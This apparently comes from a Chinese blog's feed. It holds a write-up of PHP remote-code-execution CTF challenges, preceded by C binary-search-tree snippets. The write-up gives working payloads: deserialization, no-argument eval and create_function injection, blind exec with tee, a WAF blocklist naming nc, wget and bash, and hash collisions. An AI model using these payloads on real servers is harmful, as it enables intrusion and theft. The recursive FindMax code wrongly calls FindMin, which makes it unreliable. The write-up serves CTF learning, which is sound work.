class="comment">//递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FindMin(root-&gt;left);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode*<span class="title function_">FindMin</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root)</span>&#123;<span class="comment">//非递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (root-&gt;left!=<span class="literal">NULL</span>)</span><br><span class="line">        root=root-&gt;left;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="查找最大元素"><a href="#查找最大元素" class="headerlink" title="查找最大元素"></a>查找最大元素</h5><p>和查找最小元素的思路相同，原理不再赘述。</p><p>下面是具体的代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode* <span class="title function_">FindMax</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root)</span>&#123;<span class="comment">//递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;right==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FindMin(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode*<span class="title function_">FindMax</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root)</span>&#123;<span class="comment">//非递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (root-&gt;right!=<span class="literal">NULL</span>)</span><br><span class="line">        root=root-&gt;right;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/21%20-%2022.png" alt="21 - 22"></p>]]></content>
    
    
    <summary type="html">连一刻也没有为图的听不懂哀悼，立刻赶来战场的是——查找！</summary>
    
    
    
    <category term="数据结构学习" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="BTS" scheme="http://example.com/tags/BTS/"/>
    
    <category term="AVL" scheme="http://example.com/tags/AVL/"/>
    
  </entry>
  
  <entry>
    <title>PHP的RCE问题集锦</title>
    <link href="http://example.com/2023/12/04/PHP%E7%9A%84RCE%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6/"/>
    <id>http://example.com/2023/12/04/PHP%E7%9A%84RCE%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6/</id>
    <published>2023-12-04T09:17:33.000Z</published>
    <updated>2024-02-21T03:29:16.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>RCE</code>是Remote Command Exec(远程命令执行)和Remote Code Exec(远程代码执行)的缩写;Command指的是操作系统的命令，code指的是脚本语言(php)的代码。CTF中有许多涉及到RCE的题目，我会将我遇到的题放在这里汇总并且穿插知识点讲解。</p><h2 id="湖南省网络攻防邀请大赛-ezrce"><a href="#湖南省网络攻防邀请大赛-ezrce" class="headerlink" title="湖南省网络攻防邀请大赛-ezrce"></a>湖南省网络攻防邀请大赛-ezrce</h2><p>原题代码如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shell</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;exp);</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span> , <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[<span class="subst">$code</span>]+$/&quot;</span>,<span class="variable">$str</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;exp.<span class="string">&quot; hello world!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]|get/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简单的审一下题，发现有四个关键点。</p><ol><li>开头的shell类中定义了一个析构函数<code> __destruct()</code>，意思是当对象在被销毁时调用此方法。一般出现魔术常量，十有八九就要用到反序列化了。</li><li>析构函数内部有<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $this-&gt;exp)</code>这一串代码。<code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用。</li><li><code>eval($this-&gt;exp.&quot; hello world!&quot;);</code>中，这串代码在传入的exp后面拼接上了一个<code>hello world！</code>，这会导致eval语句产生语法错误而任意执行失败，需要想办法绕过。</li><li><code>if(!preg_match(&#39;/^[Oa]|get/i&#39;,$_GET[&#39;exp&#39;]))</code>这个正则匹配我们使用get方式上传的exp中以‘O’或‘a’开头以及匹配所有‘get’开头的单词，如果没有匹配到才能执行反序列化。</li></ol><p>也就是说这一道题就相当于四道题的知识点，而且还把这四个点组合在一起，实在是用心险恶。</p><p>那么我们就将其逐个击破依次来分析到底应该如何绕过达到RCE。</p><h3 id="绕过传参正则匹配"><a href="#绕过传参正则匹配" class="headerlink" title="绕过传参正则匹配"></a>绕过传参正则匹配</h3><p>由于题目中用到了析构函数<code> __destruct()</code>和反序列化函数<code>unserialize()</code>，所以我们需要构造一个exp将其实例化后的序列化字符串作为参数传入。但是这里有一个问题，当我们对exp实例化后，它的类型就变成了”对象“<code>Object</code>，实例化后的字符串开头必为<code>O</code>，这就导致我们被waf拦截无法成功传入exp。同样的，利用数组绕过，将数组元素实例化也无法绕过waf，因为数组序列化字符串开头为<code>a</code>。</p><p>咋一看好像我们所有的路都被堵死了，我过我在查阅大量资料后发现了几篇大佬的博客，有一段是这么说的：</p><blockquote><p>说说实现了serializable接口的类</p><p>实现了serializable接口的类在序列化的时候返回的字符串是C开头的</p><p>这一点可以绕过例如 O:\d+的这种正则</p></blockquote><p>而且还可以通过跑一个脚本来查看当前哪些类继承了serializable。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$clazz</span>)&#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$clazz</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>,<span class="keyword">array</span>(<span class="string">&quot;serialize&quot;</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$clazz</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161325432.png" alt="image-20231204161325432"></p><p>也就是说，用这几个类来实例化对象，返回的序列化字符串开头将为<code>C</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161421082.png" alt="image-20231204161421082"></p><p>但是这么做仍然有问题。由于PHP版本的原因，高版本跑出来的序列化字符串仍然为<code>O</code>。但是自己写的类去实现serializeble接口再去序列化是没有问题的。建议用phpstorm，ide有在线低版本平台，是可以跑出来结果的。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204162158897.png" alt="image-20231204162158897"></p><p>这里插句题外话，当时我没有找到合适的低版本平台，所以是照着老版本的序列化格式手搓exp的，还开了个字数统计器去数字数……</p><p>总之，通过调用实现了serializable接口的类，是可以实现绕过正则传参的。</p><p>至于为什么可以得到<code>C格式</code>，这个C的意思有可能是 <strong>Customized serializing</strong> 的意思。具体的原理可见后续的参考文章。</p><h3 id="攻破无参RCE"><a href="#攻破无参RCE" class="headerlink" title="攻破无参RCE"></a>攻破无参RCE</h3><p>在传入序列化exp后，下一只拦路虎就是<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $this-&gt;exp)</code>了。以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数，我们称呼它为<code>无参RCE</code>。</p><p>无参RCE主要考查的是你对与PHP函数的基类，无需输入参数来实现任意文件读取。</p><p>这里我们构造exp为<code>print_r(scandir(current(localeconv())));</code>。</p><ul><li><code>localeconv()</code>:返回一包含本地数字及货币格式信息的数组，数组的第一项是<code>.</code>，<code>.</code>的意思是当前目录。同理<code>getcwd()</code>函数也具有同样的效果，但是由于本题waf禁止了序列化中<code>get</code>开头的单词，所以不用这个。</li><li><code>current()</code>:返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回当前文件的工作目录。</li><li><code>scandir()</code>:列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 **<code>FALSE</code>**。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li><li><code>print_r()</code>:以规定的格式打印对象，数组等结构。</li></ul><p>也就是说，这四个函数组合在一起就是返回并打印当前目录中的文件情况。</p><p>但是此时仍然无法顺利进行传参，因为还有最后一道墙等着我们。</p><h3 id="绕过拼接符"><a href="#绕过拼接符" class="headerlink" title="绕过拼接符"></a>绕过拼接符</h3><p>因为末尾拼接了换行和非法的php语法字符串，导致语法错误。如果没有换行的话，可以采用注释来绕过，但是这里不行，无参RCE的筛选会导致单行注释失败。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;exp);</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span> , <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[<span class="subst">$code</span>]+$/&quot;</span>,<span class="variable">$str</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;exp.<span class="string">&quot; hello world!&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>经过一系列复杂的正则，<code>$str</code>变量被筛去形如<code>abc((()))</code>的格式，最终只会得到一条完整语句的最后那部分<code>;</code>。而<code>$code</code>截取并赋值为<code>$str</code>的第一个字符，也为<code>;</code>。最后进入eval语句的正则匹配含义是要求<code>$str</code>变量完全由<code>$code</code>的字符构成，也就是说<code>$str</code>必须全为<code>;</code>。</p><p>然而针对这种情况，可以使用CTF以前常见的一种思路，来进行闭合PHP语句向下执行。构造exp为<code>print_r(scandir(current(localeconv())));__halt_compiler();</code>。</p><p>关于<code>__halt_compiler()</code>:<a href="https://www.php.net/manual/zh/function.halt-compiler.php">php文档介绍</a>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204165547944.png" alt="image-20231204165547944"></p><p>这里我们用<code>;</code>隔离了两条语句上传，最后<code>$str</code>值为<code>;;</code>，不影响最后的正则匹配，因此可以进入eval语句并且成功绕过拼接符后的非法字符串。</p><p>至此，万事俱备只欠东风。</p><h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><p>构造exp并序列化后，传参<code>?exp=C:11:&quot;ArrayObject&quot;:103:&#123;x:i:0;a:0:&#123;&#125;;m:a:1:&#123;s:1:&quot;a&quot;;O:5:&quot;shell&quot;:1:&#123;s:3:&quot;exp&quot;;s:40:&quot;print_r(scandir(current(localeconv())));&quot;;&#125;&#125;&#125;</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170110308.png" alt="image-20231204170110308"></p><p>得到敏感文件。</p><p>继续构造exp为<code>highlight_file(next(array_reverse(scandir(current(localeconv())))));__halt_compiler();</code>。</p><ul><li><code>array_reverse()</code>:数组反转，将索引和值对换，在这里就是将文件名和对应的文件内容关系对换，将文件内容作为索引值。</li><li><code>next()</code>:将内部指针指向数组中的下一个元素，并输出。</li><li><code>highlight_file()</code>:高亮显示文件内容。</li></ul><p>组合在一起就是高亮回显flag的文件代码。</p><p>传入exp的序列化字符串<code>?exp=C:11:&quot;ArrayObject&quot;:149:&#123;x:i:0;a:0:&#123;&#125;;m:a:1:&#123;s:1:&quot;a&quot;;O:5:&quot;shell&quot;:1:&#123;s:3:&quot;exp&quot;;s:86:&quot;highlight_file(next(array_reverse(scandir(current(localeconv())))));__halt_compiler();&quot;;&#125;&#125;&#125;</code>。</p><p>得到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170744618.png" alt="image-20231204170744618"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.extrader.top/posts/4f9c9406/#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81">PHP无参数RCE | Extraderの博客</a></li><li><a href="http://www.manongjc.com/detail/58-fiksrlppxmnbcoi.html">【CTF竞赛】无参数RCE总结 - 码农教程 (manongjc.com)</a></li><li><a href="https://cjlusec.ldxk.edu.cn/2023/04/07/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8">原生类在反序列化中的利用</a></li><li><a href="https://forum.butian.net/index.php/share/926">一次对PHP正则绕过的思考历程</a></li><li><a href="https://www.bilibili.com/read/cv22995917/">【闲扯】PHP Serializable接口 - 哔哩哔哩 (bilibili.com)</a></li></ul><h2 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h2><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>话不多说直接上源代码 ↓ </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>分析源代码可得出两个重点，一是有正则筛选黑名单，需要绕过WAF；二是命令执行函数为<code>exec()</code>，该函数无回显，也就是说我们不知道命令执行的结果。</p><p>关于无回显RCE问题，其实网上也有丰富的学习资料。比如利用<code>nc</code>等指令将数据外带到VPS上等。</p><p>但是这道题的WAF过滤了诸多字段，包括<code>nc</code>在内的大部分指令都被禁用了。于是经过资料查询，我们可以使用<code>tee</code>指令。</p><p>tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。更具体的资料可以查看菜鸟教程<a href="https://www.runoob.com/linux/linux-comm-tee.html">Linux tee命令 | 菜鸟教程 (runoob.com)</a>。</p><p>于是我们可以构造payload<code>http://node4.anna.nssctf.cn:28125/?url=l&#39;&#39;s |tee 1.txt</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112002684.png" alt="image-20240221112002684"></p><p>可以看到这里我们利用了<code>&#39;&#39;</code>绕过了WAF，并且将内容输出到了1.txt文件。此时我们切换到<code>http://node4.anna.nssctf.cn:28125/1.txt</code>去查看文件。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112235705.png" alt="image-20240221112235705"></p><p>写入成功，接下来我们就可以慢慢穿越目录找flag了。</p><p>最后使用exp<code>http://node4.anna.nssctf.cn:28125/?url=tac /flllll\aaaaaaggggggg|tee 1.txt</code>结束战斗。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112633338.png" alt="image-20240221112633338"></p><p>得到flag<code>NSSCTF&#123;64645b91-933c-49ca-9a67-d54a6a253297&#125;</code>。</p><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://blog.csdn.net/cosmoslin/article/details/123039067">【CTF】命令执行无回显利用_exec($cmd) 无回显-CSDN博客</a></li><li><a href="https://www.nssctf.cn/note/set/2564">文章 - 【SWPUCTF 2021 新生赛]finalrce Leaderchen的WriteUp | NSSCTF】</a></li></ul><h2 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h2><p>这道题有多个leve，所以我们一步步来复现。</p><p>首先进入环境。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181611748.png" alt="image-20240222181611748"></p><p>noting here.</p><p>这肯定不对啊，打开源代码看看。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181741758.png" alt="image-20240222181741758"></p><p>我靠这就是level1，赶紧套个小标题压压惊。</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>那么正式开始分析，这里的源代码<code>&lt;!-- disallow: --&gt;</code>暗示我们可能有源码泄露，于是我们访问一下<code>/robots.txt</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181924043.png" alt="image-20240222181924043"></p><p>果然，于是我们访问<code>/level_2_1s_h3re.php</code>，移动到level2。</p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222182016334.png" alt="image-20240222182016334"></p><p>一眼望过去又是PHP中的md5碰撞，不过这里是强碰撞，且进行了字符化处理，也就是说0e碰撞和数组绕过的特性失效了。看来是真的要输入两个碰撞的md5值，没什么好说的，上网查资料，果然有现成的exp，放在这里备用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>一顿操作后得到level3的路径。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183112065.png" alt="image-20240222183112065"></p><p>访问<code>Level___3.php</code>以移动到level3。</p><p>tips：最好使用burpsuite抓包发送，我用hackbar发送总是过不去，但是用burpsuite就没毛病……</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183219619.png" alt="image-20240222183219619"></p><p>同样的结构，只不过这次要求sha1碰撞，上网查exp，直接过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183521462.png" alt="image-20240222183521462"></p><p>成功得到level4路径，访问<code>level_level_4.php</code>移动到level4。</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183701902.png" alt="image-20240222183701902"></p><p>这题有点意思。</p><p>明面上的思路就是以Get的方式发送变量名为<code>NI_SA_</code>值为<code>txw4ever</code>即可，即<code>http://node5.anna.nssctf.cn:28468/level_level_4.php?NI_SA_=txw4ever</code>。但是这么做的话，<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>的值将变为<code>level_level_4.php?NI_SA_=txw4ever</code>，经过<code>parse_url()</code>处理后的<code>query</code>字段将为<code>NI_SA_</code>，而这恰好是在正则过滤黑名单中的，所以我们得绕过这个WAF。</p><p>这里就要说到一个特性，PHP会将请求参数中的非法字符替换为下划线，这里用<code>+</code>绕过，构造exp<code>/?NI+SA+=txw4ever</code>，可以得到level5的路径。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184653073.png" alt="image-20240222184653073"></p><p>根据<code>55_5_55.php</code>移动到level5。</p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184740573.png" alt="image-20240222184740573"></p><p>终于进入正题，来到RCE环节。注意到<code>$a(&#39;&#39;,$b);</code>，考虑使用<code>create_function()</code>来进行RCE。</p><p>这里简单的介绍一下我对<code>create_function()</code>函数的理解，更详细的介绍可以移步参考部分。</p><p><code>create_function(&#39;字符串参数&#39;,&#39;字符串代码&#39;)</code>是一个PHP中用来创建匿名函数的函数，它接受两个字符串参数，第一个参数声明接受的形参，第二个参数用来描述函数的主体部分。以下是一个<code>create_function()</code>的使用范例。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return($a+$b)&#x27;</span>);</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="variable">$fun</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$a</span>+<span class="variable">$b</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果第二个参数是可控的，那么我们就可以利用<code>create_function()</code>来完成命令执行，原理如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;$b&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;return &quot;ben is so handsome.&quot;&#125;;phpinfo();/*&#x27;</span>;</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="variable">$fun</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ben is so handsome&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">//有点类似于SQL注入，提前闭合中括号，命令执行，再把原有的中括号注释掉。</span></span><br></pre></td></tr></table></figure><p>同理，在这里我们也可以利用<code>create_function()</code>命令执行。令<code>$a=create_function</code>，<code>$b=&#125;;system(&#39;tac /f*&#39;);/*</code>构造exp。又因为存在WAF对<code>$a</code>的第一个字符进行过滤，捕捉任何字母和数字，所以我们还需要利用反斜杠进行绕过，即<code>$a=\create_funtion</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222190652192.png" alt="image-20240222190652192"></p><p>得到flag，收工。</p><h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><ul><li>[$_SERVER<a href="https://blog.csdn.net/qq_38568388/article/details/78353449">“REQUEST_URI”]函数_$_server[‘request_uri’]-CSDN博客</a></li><li><a href="https://baike.baidu.com/item/create_function/2535040?fr=ge_ala">create_function_百度百科 (baidu.com)</a></li><li><a href="https://zhuanlan.zhihu.com/p/377733114">CTF系列 PHP create_function的利用方式 - 知乎 (zhihu.com)</a></li></ul><h2 id="GXYCTF-2019-禁止套娃"><a href="#GXYCTF-2019-禁止套娃" class="headerlink" title="[GXYCTF 2019]禁止套娃"></a>[GXYCTF 2019]禁止套娃</h2><p>容器，启动！</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193409390.png" 